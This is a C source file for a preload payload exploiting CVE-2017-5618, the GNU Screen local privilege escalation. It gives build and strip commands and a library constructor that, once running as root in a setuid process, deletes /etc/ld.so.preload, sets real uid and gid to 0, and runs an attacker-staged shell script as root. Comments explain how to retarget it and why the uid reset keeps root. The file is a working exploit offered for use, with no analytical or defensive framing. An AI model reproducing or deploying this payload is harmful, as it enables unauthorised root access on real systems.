/* libhax.c — CVE-2017-5618 preload payload.
 *
 * Runs from ld.so's constructor: before main(), in every process that loads it,
 * with the loader's privileges — i.e. euid 0 the moment a setuid binary starts.
 *
 * Build against the target's ABI, not yours:
 *   gcc -Os -fPIC -shared -fno-stack-protector -fno-asynchronous-unwind-tables \
 *       -o libhax.so libhax.c
 *   strip --strip-unneeded libhax.so
 *   objdump -T libhax.so | grep -oE 'GLIBC_[0-9.]+' | sort -uV     # want GLIBC_2.2.5 only
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

/* Everything the payload touches lives here. Change these three lines to retarget
 * the payload at a different host — the paths must be writable by the unprivileged
 * user that owns the stage directory. */
#define STAGE  "/tmp/screenroot"
#define LOCK   STAGE "/.lock"
#define SCRIPT STAGE "/rootcmd.sh"
#define OUT    STAGE "/rootout.txt"

__attribute__ ((__constructor__))
void dropshell(void)
{
    if (geteuid() != 0)                 /* every process loads it; only act as root */
        return;

    int fd = open(LOCK, O_CREAT | O_EXCL | O_WRONLY, 0600);
    if (fd < 0)                         /* single-shot: never run twice */
        return;
    close(fd);

    unlink("/etc/ld.so.preload");        /* remove ourselves before spawning children */

    /* Drop the split personality before exec'ing anything.
     *
     * A setuid program has uid != euid. dash and bash both detect that on startup
     * and voluntarily give up the effective uid unless they are invoked with -p.
     * Without this, system() succeeds but the shell it spawns is plain `aero`:
     * `id` prints aero, /root is unreadable, and a `chmod 4755` copy of bash ends up
     * owned by aero — a plausible-looking result that grants nothing.
     * Setting the real uid and gid to 0 too means the child has no reason to drop. */
    setgid(0);
    setuid(0);

    system("/bin/sh " SCRIPT " > " OUT " 2>&1");
    chmod(OUT, 0666);
}
